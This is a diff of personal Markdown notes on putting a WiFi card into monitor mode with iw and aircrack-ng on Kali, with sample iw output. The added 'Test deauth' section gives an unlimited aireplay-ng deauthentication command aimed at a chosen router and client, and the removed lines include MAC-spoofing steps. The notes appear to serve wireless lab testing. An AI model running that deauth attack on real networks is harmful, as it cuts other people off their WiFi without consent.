@@ -1,16 +1,13 @@
 ## Monitor Mode
 
-2021-03-12
+2021-04-07
 
-Tested with Linux Mint 20.1
+Tested with Kali Linux
 
 -----
-### Test Packet Injection
-
-
 Install the aircrack-ng package
 ```
-$ sudo apt-get install aircrack-ng
+$ sudo apt install aircrack-ng
 ```
 
 Ensure Network Manager doesn't cause problems
@@ -20,116 +17,62 @@ $ sudo nano /etc/NetworkManager/NetworkManager.conf
 add
 ```
 [keyfile]
-unmanaged-devices=interface-name:mon0
+unmanaged-devices=interface-name:mon0;interface-name:mon1
 ```
 
-
-Determine the phy interface name
+Enable monitor mode using iw and ip:
 ```
 $ sudo iw dev
 ```
-Note: Replace phy0 with your interface name.
+```
+phy#0
+	Interface wlan0
+		ifindex 3
+		wdev 0x1
+		addr aa:bb:cc:dd:00:cc
+		type managed
+		txpower 12.00 dBm
+```
+Add monitor interface
 ```
 $ sudo iw phy phy0 interface add mon0 type monitor
-
-$ sudo ip link set mon0 up
-
-$ sudo ip link show dev mon0
 ```
-
-
-Test Packet Injection
-
-$ sudo aireplay-ng --test mon0
-
-
-Search for networks
-
+Check that mon0 was added
+```
+$ sudo iw dev
+```
+```
+phy#0
+	Interface mon0
+		ifindex 5
+		wdev 0x2
+		addr aa:bb:cc:dd:00:cc
+		type monitor
+		channel 1 (2412 MHz), width: 20 MHz (no HT), center1: 2412 MHz
+		txpower 23.00 dBm
+	Interface wlan0
+		ifindex 4
+		wdev 0x1
+		addr aa:bb:cc:dd:00:cc
+		type managed
+		txpower 23.00 dBm
+```
+-----
+Test injection
+```
 $ sudo airodump-ng mon0 --band ag
 
------
-### Enter Monitor Mode
+$ sudo iw dev mon0 set channel 149 (or whatever channel you want)
 
-Start by making sure the system recognizes the WiFi interface
-```
-$ iw dev
-```
-Note: The output shows the WiFi interface name and the current
-mode among other things. The interface name may be something like
-`wlx00c0cafre8ba` and is required for many of the below commands.
-
-
-Take the interface down
-```
-$ sudo ip link set <your interface name here> down
-```
-
-Set monitor mode
-```
-$ sudo iw <your interface name here> set monitor control
-```
-
-Bring the interface up
-```
-$ sudo ip link set <your interface name here> up
-```
-
-Verify the mode has changed
-```
-$ iw dev
+$ sudo aireplay-ng --test mon0
 ```
 -----
+Test deauth
+```
+$ sudo airodump-ng mon0 --band ag
 
-### Revert to Managed Mode
+$ sudo airodump-ng mon0 --bssid <routerMAC> --channel <channel of router>
 
-Take the interface down
-```
-$ sudo ip link set <your interface name here> down
-```
-
-Set managed mode
-```
-$ sudo iw <your interface name here> set type managed
-```
-
-Bring the interface up
-```
-$ sudo ip link set <your interface name here> up
-```
-
-Verify the mode has changed
-```
-$ iw dev
+$ sudo aireplay-ng --deauth 0 -c <deviceMAC> -a <routerMAC> mon0 -D
 ```
 -----
-
-### Change the MAC Address before entering Monitor Mode
-
-Take down things that might interfere
-```
-$ sudo airmon-ng check kill
-```
-Check the WiFi interface name
-```
-$ iw dev
-```
-Take the interface down
-```
-$ sudo ip link set dev <your interface name here> down
-```
-Change the MAC address
-```
-$ sudo ip link set dev <your interface name here> address <your new mac address>
-```
-Set monitor mode
-```
-$ sudo iw <your interface name here> set monitor control
-```
-Bring the interface up
-```
-$ sudo ip link set dev <your interface name here> up
-```
-Verify the MAC address and mode has changed
-```
-$ iw dev
-```
